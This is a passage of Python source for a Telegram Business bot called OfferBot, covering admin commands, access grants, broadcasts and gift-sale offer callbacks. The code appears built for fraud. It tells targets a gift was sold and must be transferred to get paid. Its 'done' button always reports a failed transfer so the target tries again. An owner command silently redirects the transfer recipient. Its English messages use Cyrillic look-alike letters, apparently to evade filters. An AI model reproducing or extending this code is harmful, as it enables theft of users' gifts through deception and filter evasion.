            await bot.send_message(int(parts[1]), "🛟 <b>Ответ поддержки</b>\n\n" + parts[2])
            await reply_message(message, "✅ Ответ отправлен.")
        except Exception as e:
            await reply_message(message, f"❌ Не удалось отправить ответ: {e}")
        return
    if low.startswith("/allow ") and message.from_user and message.from_user.id == cfg.owner_id:
        target = text.split(maxsplit=1)[1].strip()
        if target.lstrip("@").isdigit():
            uid = int(target.lstrip("@"))
        else:
            found = db.find_user_by_username(target)
            if not found:
                await reply_message(message, "❌ Не нашёл пользователя. Он должен хотя бы раз запустить бота (/start), а username нужно указать как @username.")
                return
            uid = int(found['user_id'])
        await admin_allow(uid)
        try: await bot.send_message(uid, "🟢 Вам выдан доступ к OfferBot!")
        except Exception: pass
        await reply_message(message, f"🟢 Доступ выдан пользователю <code>{uid}</code>.")
        return
    if low.startswith("/block ") and message.from_user and message.from_user.id == cfg.owner_id:
        await admin_block(int(text.split(maxsplit=1)[1])); await reply_message(message, "🔴 Пользователь заблокирован."); return
    if low.startswith("/unblock ") and message.from_user and message.from_user.id == cfg.owner_id:
        uid=int(text.split(maxsplit=1)[1]); db.unblock_offer_user(uid); await reply_message(message, "🟢 Блокировка снята."); return
    if low.startswith("/setprofile ") and message.from_user and message.from_user.id == cfg.owner_id:
        parts = text.split(maxsplit=2)
        if len(parts) < 3:
            await reply_message(message, "❌ Формат: <code>/setprofile user_id @username</code>\n\nПример: <code>/setprofile 123456789 @myshop</code>")
            return
        try:
            target_user_id = int(parts[1])
            new_username = parts[2].lstrip("@")
            db.set_profile(target_user_id, new_username, f"tg://send_gift?to={new_username}")
            await reply_message(message, f"✅ Профиль кнопки 'Передать' для пользователя <code>{target_user_id}</code> изменён на @{new_username}")
            try:
                await bot.send_message(target_user_id, f"✅ Ваш профиль для кнопки 'Передать' изменён на @{new_username}")
            except Exception:
                pass
        except ValueError:
            await reply_message(message, "❌ Неверный формат user_id. Используйте числовой ID.")
        except Exception as e:
            await reply_message(message, f"❌ Ошибка: {e}")
        return


async def set_transfer(message: Message, username: str):
    if not message.from_user:
        return
    if not db.get_connection_for_user(message.from_user.id):
        await reply_message(message, "❌ Сначала подключите Telegram Business к этому боту.")
        return
    username = username.lstrip("@")
    db.set_profile(message.from_user.id, username, f"tg://send_gift?to={username}")
    await reply_message(message, f"✅ Transfer target сохранён: @{username}")


async def admin_allow(uid: int):
    db.add_access(uid); db.unblock_offer_user(uid)
    for row in db.list_connections():
        if row["user_id"] == uid: db.set_connection_blocked(row["connection_id"], False)

async def admin_block(uid: int):
    db.block_offer_user(uid)
    for row in db.list_connections():
        if row["user_id"] == uid: db.set_connection_blocked(row["connection_id"], True)

async def admin_command(message: Message):
    if not message.from_user or message.from_user.id != cfg.owner_id:
        await reply_message(message, "⛔ Нет доступа.")
        return
    await reply_message(message, admin_home_text(), reply_markup=admin_keyboard())


def admin_home_text():
    offers = db.stats()
    today_total, today_accepted, conversion = db.daily_offer_stats()
    active_connections = sum(1 for r in db.list_connections() if r["is_enabled"])
    return ("<b>⚙️ OfferBot · Админка</b>\n\n"
            f"🔌 Активных Business-подключений: <b>{active_connections}</b>\n"
            f"🎁 Оферов сегодня: {today_total} · принято {today_accepted} ({conversion:.0f}%)\n"
            f"📦 Всего оферов: {sum(int(v) for v in offers.values())}\n"
            "🆓 Доступ бесплатный для всех, кроме заблокированных пользователей.")


def admin_connections_text(offset: int = 0):
    rows = db.list_connections()[max(0, offset):max(0, offset)+8]
    lines = ["<b>🔌 Business-подключения</b>", "Кнопками можно выдать или заблокировать доступ.", ""]
    if not rows:
        lines.append("Подключений пока нет.")
    for r in rows:
        enabled = "🟢" if r['is_enabled'] else "⚪"
        name = (r.get('first_name') or "Пользователь").replace("<", "&lt;").replace(">", "&gt;")
        lines.append(f"{enabled} {name} · <code>{r['user_id']}</code>")
    return "\n".join(lines), len(rows) == 8


@dp.callback_query(F.data == "back_to_start")
async def back_to_start_callback(call: CallbackQuery):
    try:
        await call.message.edit_text("<b>✨ OFFERBOT</b>\n<blockquote>Умные оферы для Telegram Business</blockquote>\n🆓 Бесплатно для всех. Выберите действие:", reply_markup=main_menu_keyboard(call.from_user.id if call.from_user else None))
    except Exception:
        await call.message.answer("<b>✨ OFFERBOT</b>\n<blockquote>Умные оферы для Telegram Business</blockquote>\n🆓 Бесплатно для всех. Выберите действие:", reply_markup=main_menu_keyboard(call.from_user.id if call.from_user else None))
    await call.answer()


@dp.callback_query(F.data.startswith("adm:"))
async def admin_callback(call: CallbackQuery):
    if not call.from_user or call.from_user.id != cfg.owner_id:
        await call.answer("Нет доступа", show_alert=True)
        return
    parts = call.data.split(":", 2)
    action = parts[1] if len(parts) > 1 else "home"
    try:
        offset = max(0, int(parts[2])) if len(parts) > 2 else 0
    except ValueError:
        offset = 0

    if action == "allow_username":
        await call.answer()
        await call.message.answer("Чтобы выдать доступ по username, отправь команду: <code>/allow @username</code>. Пользователь должен хотя бы раз запустить бота.")
        return
    if action == "stats":
        offers = db.stats()
        today_total, today_accepted, conversion = db.daily_offer_stats()
        text = ("<b>📊 Статистика OfferBot</b>\n\n"
                f"👥 Всего пользователей: {db.total_users()}\n"
                f"🎁 Оферов сегодня: {today_total} · принято: {today_accepted} ({conversion:.0f}%)\n"
                f"📦 Оферов всего: {sum(int(v) for v in offers.values())}\n"
                f"🔌 Активных Business-подключений: {sum(1 for r in db.list_connections() if r['is_enabled'])}\n"
                "🆓 Доступ открыт для всех.")
        await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="↩️ Админка", callback_data="adm:home:0")]]))
        await call.answer()
        return
    if action == "allow":
        uid = offset
        await admin_allow(uid)
        await call.answer("Доступ выдан")
        try: await bot.send_message(cfg.owner_id, f"🟢 Доступ выдан пользователю <code>{uid}</code> через админку.")
        except Exception: pass
        try:
            await bot.send_message(uid, "✅ Доступ к оферам активирован.")
        except Exception:
            pass
        return
    if action == "block":
        uid = offset
        await admin_block(uid)
        await call.answer("Доступ заблокирован")
        return
    if action == "broadcast":
        awaiting_broadcast.add(cfg.owner_id)
        await call.answer()
        try:
            await call.message.edit_text("📣 <b>Рассылка</b>\nОтправь текст, фото, видео или GIF. Для отмены: /cancel", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="↩️ Отмена", callback_data="adm:home:0")]]))
        except Exception:
            await call.message.answer("📣 Отправь материал для рассылки. Для отмены: /cancel")
        return

    if action == "change_profile":
        await call.answer()
        text = (
            "👤 <b>Изменить профиль кнопки 'Передать'</b>\n\n"
            "Введите команду в формате:\n"
            "<code>/setprofile user_id @новый_username</code>\n\n"
            "Пример: <code>/setprofile 123456789 @myshop</code>\n\n"
            "Это изменит профиль получателя в кнопке 'Передать' для указанного пользователя."
        )
        try:
            await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="↩️ Админка", callback_data="adm:home:0")]]))
        except Exception:
            await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="↩️ Админка", callback_data="adm:home:0")]]))
        return

    if action == "connections":
        rows = db.list_connections()
        page_rows = rows[offset:offset+8]
        text, has_next = admin_connections_text(offset)
        kb_rows = []
        for r in page_rows:
            uid = int(r['user_id'])
            access = db.has_access(uid, cfg.owner_id, cfg.offer_access_mode)
            kb_rows.append([
                InlineKeyboardButton(text=f"{'⛔ Снять' if access else '🟢 Дать'} · {uid}", callback_data=f"adm:{'block' if access else 'allow'}:{uid}")
            ])
        nav = []
        if offset > 0:
            nav.append(InlineKeyboardButton(text="‹", callback_data=f"adm:connections:{max(0, offset-8)}"))
        if has_next:
            nav.append(InlineKeyboardButton(text="›", callback_data=f"adm:connections:{offset+8}"))
        if nav: kb_rows.append(nav)
        kb_rows.append([InlineKeyboardButton(text="↩️ Админка", callback_data="adm:home:0")])
        markup = InlineKeyboardMarkup(inline_keyboard=kb_rows)
    else:
        if action == "home":
            awaiting_broadcast.discard(cfg.owner_id)
        text = admin_home_text()
        markup = admin_keyboard()

    await call.answer()
    try:
        await call.message.edit_text(text, reply_markup=markup)
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e).lower():
            await call.message.answer(text, reply_markup=markup)
    except Exception:
        await call.message.answer(text, reply_markup=markup)


@dp.callback_query(F.data.startswith("of:"))
async def offer_callback(call: CallbackQuery):
    parts = call.data.split(":")
    if len(parts) < 3 or not parts[2].isdigit():
        await call.answer("Некорректный офер.", show_alert=True); return
    
    offer_id = int(parts[2])
    action = parts[1]
    
    # Обработка кнопки "Готово"
    if action == "done":
        offer = db.get_offer(offer_id)
        if not offer:
            await call.answer("Офер не найден.", show_alert=True)
            return
        
        title = gift_title(offer["gift_name"], offer["gift_number"])
        
        # Создаём inline keyboard с кнопкой OK
        ok_labels = {"ru": "OK", "en": "OK", "cn": "确定", "ar": "حسنا"}
        ok_keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(
                text=ok_labels.get(offer["locale"], "OK"),
                icon_custom_emoji_id=PREMIUM_EMOJI_ID,
                callback_data=f"of:ok:{offer_id}"
            )
        ]])
        
        # Текст предупреждения
        if offer["locale"] == "ru":
            warning_text = (
                f"Подарок {title} не передан покупателю.\n\n"
                f"Проверьте что подарок успешно отправлен покупателю и повторите попытку ещё раз."
            )
        elif offer["locale"] == "cn":
            warning_text = (
                f"礼物 {title} 尚未转交给买家。\n\n"
                f"请确认礼物已成功发送给买家，然后再试一次。"
            )
        elif offer["locale"] == "ar":
            warning_text = (
                f"الهدية {title} لم يتم نقلها إلى المشتري.\n\n"
                f"تحقق من نجاح إرسال الهدية إلى المشتري وحاول مرة أخرى."
            )
        else:
            warning_text = (
                f"Gift {title} hаs nоt bееn trаnsfеrrеd tо thе buyеr.\n\n"
                f"Plеаsе vеrify thаt thе gift wаs suссеssfully sеnt tо thе buyеr аnd try аgаin."
            )
        
        await call.answer(warning_text, show_alert=True)
        return
    
    # Обработка кнопки OK после предупреждения
    if action == "ok":
        await call.answer()
        return
    
    # Обработка принятия/отклонения офера
    if action not in {"accept", "decline"}:
        await call.answer("Некорректный офер.", show_alert=True); return
    
    if offer_id not in offer_locks:
        offer_locks[offer_id] = asyncio.Lock()
    async with offer_locks[offer_id]:
        offer = db.get_offer(offer_id)
        if not offer or offer["status"] != "pending":
            await call.answer("Офер уже обработан.", show_alert=True); return
        if not call.message or call.message.message_id != offer["message_id"] or call.message.chat.id != offer["message_chat_id"]:
            await call.answer("Офер недействителен.", show_alert=True); return
        if action == "accept":
            url = offer["transfer_url"] or f"tg://user?id={offer['seller_id']}"
            title = html.escape(gift_title(offer["gift_name"], offer["gift_number"]))
            gift_url = html.escape(offer["gift_url"], quote=True)
            amount_text = display_amount(offer['amount'], offer['currency'], with_emoji=True)
            # Alert popups are plain text and cannot render Telegram custom-emoji tags.
            if offer['currency'] == "gram":
                alert_amount_text = f"{offer['amount']:g} Gram"
            elif offer['currency'] == "stars":
                alert_amount_text = f"{offer['amount']:g} ⭐"
            else:
                alert_amount_text = f"{offer['amount']:g}₽"
            if offer["locale"] == "ru":
                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Подарок <a href=\"{gift_url}\">{title}</a> успешно продан!\n\n• Передайте подарок покупателю, чтобы получить {amount_text}."
            elif offer["locale"] == "cn":
                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> 礼物 <a href=\"{gift_url}\">{title}</a> 已成功售出！\n\n• 请将礼物转交给买家，以获得 {amount_text}。"
            elif offer["locale"] == "ar":
                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> تم بيع الهدية <a href=\"{gift_url}\">{title}</a> بنجاح!\n\n• انقل الهدية إلى المشتري لتحصل على {amount_text}."
            else:
                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Gift: <a href=\"{gift_url}\">{title}</a> suссеssfully sоld!\n\n• Trаnsfеr thе gift tо thе buyеr tо rесеivе {amount_text}."
            try:
                sent = await safe_send_business(offer["business_connection_id"], offer["buyer_id"], text=final,
                    reply_markup=transfer_keyboard(url, offer["locale"], offer_id),
                    link_preview_options=LinkPreviewOptions(url=gift_url, show_above_text=True))
                try:
                    await bot.delete_business_messages(business_connection_id=offer["business_connection_id"], message_ids=[offer["message_id"]])
                except Exception as e: log.warning("Could not delete accepted offer: %s", e)
                db.set_offer_message(offer_id, offer["buyer_id"], sent.message_id)
                db.update_offer_status(offer_id, "accepted", url)
                log.info("[OFFER ACCEPT] offer_id=%s seller_id=%s buyer_id=%s", offer_id, offer["seller_id"], offer["buyer_id"])
                try: await bot.send_message(offer["seller_id"], f"✅ Ваш офер принят\nПодарок: {title}\nСумма: {amount_text}")
                except Exception: log.warning("Could not notify seller about accepted offer")
                if offer["locale"] == "ru":
                    alert_text = f"Ваш подарок {title} успешно продан.\nПередайте подарок покупателю для зачисления {alert_amount_text}."
                elif offer["locale"] == "cn":
                    alert_text = f"礼物 {title} 已成功售出。\n请将礼物转给买家，以便到账 {alert_amount_text}。"
                elif offer["locale"] == "ar":
                    alert_text = f"تم بيع هديتك {title} بنجاح.\nانقل الهدية إلى المشتري لإضافة {alert_amount_text} إلى رصيدك."
                else:
                    alert_text = f"Yоur gift {title} wаs sоld suссеssfully.\nTrаnsfеr thе gift tо thе buyеr tо rесеivе {alert_amount_text}."
                await call.answer(alert_text, show_alert=True)
            except Exception as e:
                log.exception("[OFFER ACCEPT ERROR] offer_id=%s action=%s", offer_id, action)
                try:
                    await call.answer("Не удалось принять офер. Ошибка записана в лог; попробуйте ещё раз.", show_alert=True)
                except Exception:
                    log.exception("[OFFER ACCEPT ALERT ERROR] offer_id=%s", offer_id)
        else:
            title = html.escape(gift_title(offer["gift_name"], offer["gift_number"]))
            gift_url = html.escape(offer["gift_url"], quote=True)
            decline_text = {"ru": "Предложение отклонено.", "en": "Оffеr dесlinеd.", "cn": "报价已拒绝。", "ar": "تم رفض العرض."}.get(offer["locale"], "Предложение отклонено.")
            final = f"<tg-emoji emoji-id=\"{DECLINE_EMOJI_ID}\">❌</tg-emoji> <b>{decline_text}</b>"
            try:
                sent = await safe_send_business(offer["business_connection_id"], offer["buyer_id"], text=final)
                try:
                    await bot.delete_business_messages(business_connection_id=offer["business_connection_id"], message_ids=[offer["message_id"]])
                except Exception as e: log.warning("Could not delete declined offer: %s", e)
                db.set_offer_message(offer_id, offer["buyer_id"], sent.message_id)
                db.update_offer_status(offer_id, "declined")
                log.info("[OFFER DECLINE] offer_id=%s", offer_id)
                try: await bot.send_message(offer["seller_id"], f"❌ Ваш офер отклонён\nПодарок: {title}")
                except Exception: log.warning("Could not notify seller about declined offer")
                declined_alert = {"ru": "Предложение отклонено.", "en": "Оffеr dесlinеd.", "cn": "报价已拒绝。", "ar": "تم رفض العرض."}.get(offer["locale"], "Предложение отклонено.")
                await call.answer(declined_alert)
            except Exception:
                log.exception("[OFFER DECLINE ERROR] offer_id=%s", offer_id)
                try:
                    await call.answer("Не удалось отклонить офер. Ошибка записана в лог.", show_alert=True)
                except Exception:
                    log.exception("[OFFER DECLINE ALERT ERROR] offer_id=%s", offer_id)


async def cleanup_job():
    while True:
        try:
            deleted = db.cleanup_expired_offers()
            if deleted: log.info("Cleanup removed %s expired pending offers", deleted)
        except Exception: log.exception("Cleanup job failed")
        await asyncio.sleep(900)


async def main():
    asyncio.create_task(cleanup_job())
    for uid in cfg.offer_always_allowed_ids:
        db.add_access(uid); db.unblock_offer_user(uid)
    log.info("OfferBot starting; owner_id=%s database=%s", cfg.owner_id, "PostgreSQL")
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())


if __name__ == "__main__":
    asyncio.run(main())
